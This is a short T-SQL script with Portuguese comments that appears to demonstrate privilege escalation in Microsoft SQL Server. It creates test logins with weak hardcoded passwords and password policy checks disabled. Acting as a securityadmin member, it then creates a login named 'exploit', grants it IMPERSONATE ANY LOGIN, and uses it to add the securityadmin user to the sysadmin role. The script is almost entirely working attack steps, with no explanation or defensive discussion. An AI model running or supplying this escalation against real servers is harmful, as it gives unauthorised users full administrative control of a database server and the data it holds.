CREATE LOGIN [teste_security_admin] WITH PASSWORD = 'dirceu', DEFAULT_DATABASE=master, CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
GO

ALTER SERVER ROLE securityadmin ADD MEMBER [teste_security_admin]
GO

CREATE LOGIN [teste_sysadmin] WITH PASSWORD = 'dirceu', DEFAULT_DATABASE=master, CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
GO

ALTER SERVER ROLE sysadmin ADD MEMBER [teste_sysadmin]
GO


---------------------- conecta com usuário teste_security_admin ---------------------------------


SELECT
    USER_NAME() AS [USER_NAME],
    USER AS [USER],
    SESSION_USER AS [SESSION_USER],
    SUSER_SNAME() AS [SUSER_SNAME],
    SUSER_NAME() AS [SUSER_NAME],
	ORIGINAL_LOGIN() AS [ORIGINAL_LOGIN],
    IS_SRVROLEMEMBER('sysadmin') AS [IS_SYSADMIN],
	IS_SRVROLEMEMBER('securityadmin') AS [IS_SECURITYADMIN]
	
	
CREATE LOGIN [exploit] WITH PASSWORD = 'hacker', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF, DEFAULT_DATABASE=master
GO
	
GRANT IMPERSONATE ANY LOGIN TO [exploit]
GO


---------------------- conecta com usuário exploit ---------------------------------


ALTER SERVER ROLE sysadmin ADD MEMBER teste_security_admin
GO


